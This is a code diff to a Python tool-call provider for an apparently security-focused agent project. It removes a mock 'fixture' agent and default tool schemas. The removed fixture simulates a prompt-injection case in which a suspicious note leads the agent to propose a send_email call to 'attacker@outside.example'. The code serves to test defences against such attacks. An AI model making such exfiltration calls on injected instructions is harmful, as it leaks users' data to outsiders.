@@ -1,9 +1,8 @@
-"""Structured tool-call providers for the demo-only agent API."""
+"""Structured tool-call provider for the local project agent."""
 
 from __future__ import annotations
 
 import asyncio
-import json
 from dataclasses import dataclass
 from typing import Protocol
 
@@ -11,11 +10,6 @@ import httpx
 from pydantic import BaseModel, ConfigDict, Field, StrictStr, ValidationError
 
 from aegis.schemas import ChatRequest
-
-NORMAL_PROMPT = "Summarize the authorized launch notes."
-ATTACK_PROMPT = "Summarize the suspicious operations note."
-TIMEOUT_PROMPT = "Show the timeout scenario."
-FIXTURE_PROMPTS = (NORMAL_PROMPT, ATTACK_PROMPT, TIMEOUT_PROMPT)
 
 
 @dataclass(frozen=True)
@@ -37,43 +31,6 @@ class AgentModel(Protocol):
     simulation: bool
 
     async def next_turn(self, request: ChatRequest) -> AgentTurn: ...
-
-
-class FixtureAgentModel:
-    name = "fixture-agent-model"
-    destination = "MOCK"
-    simulation = True
-
-    async def next_turn(self, request: ChatRequest) -> AgentTurn:
-        user_text = next(message.content for message in request.messages if message.role == "user")
-        assert user_text is not None
-        tool_messages = [message for message in request.messages if message.role == "tool"]
-        if not tool_messages:
-            query = (
-                "__timeout__"
-                if user_text == TIMEOUT_PROMPT
-                else "operations"
-                if user_text == ATTACK_PROMPT
-                else "launch"
-            )
-            return AgentTurn(
-                tool_call=ProposedToolCall(
-                    "fixture-search-1", "search_docs", f'{{"query":"{query}"}}'
-                )
-            )
-        if user_text == ATTACK_PROMPT:
-            return AgentTurn(
-                tool_call=ProposedToolCall(
-                    "fixture-email-2",
-                    "send_email",
-                    '{"to":"attacker@outside.example","subject":"Synthetic note",'
-                    '"body":"Synthetic operations note"}',
-                )
-            )
-        documents = json.loads(tool_messages[-1].content or "{}").get("documents", [])
-        if not documents:
-            return AgentTurn(content="No available material.")
-        return AgentTurn(content=documents[0]["content"])
 
 
 class _CloudFunction(BaseModel):
@@ -101,7 +58,7 @@ class OpenAICompatibleAgentModel:
         api_key: str,
         model_aliases: dict[str, str],
         client: httpx.AsyncClient | None = None,
-        tools: list[dict[str, object]] | None = None,
+        tools: list[dict[str, object]],
     ) -> None:
         self.url = f"{base_url.rstrip('/')}/chat/completions"
         self._api_key = api_key
@@ -115,40 +72,7 @@ class OpenAICompatibleAgentModel:
             "stream": False,
             "parallel_tool_calls": False,
             "messages": [message.model_dump(exclude_none=True) for message in request.messages],
-            "tools": self._tools
-            if self._tools is not None
-            else [
-                {
-                    "type": "function",
-                    "function": {
-                        "name": "search_docs",
-                        "description": "Search synthetic demo documents.",
-                        "parameters": {
-                            "type": "object",
-                            "properties": {"query": {"type": "string"}},
-                            "required": ["query"],
-                            "additionalProperties": False,
-                        },
-                    },
-                },
-                {
-                    "type": "function",
-                    "function": {
-                        "name": "send_email",
-                        "description": "Demo write tool; the server may deny it.",
-                        "parameters": {
-                            "type": "object",
-                            "properties": {
-                                "to": {"type": "string"},
-                                "subject": {"type": "string"},
-                                "body": {"type": "string"},
-                            },
-                            "required": ["to", "subject", "body"],
-                            "additionalProperties": False,
-                        },
-                    },
-                },
-            ],
+            "tools": self._tools,
         }
         try:
             headers = {"Authorization": f"Bearer {self._api_key}"}
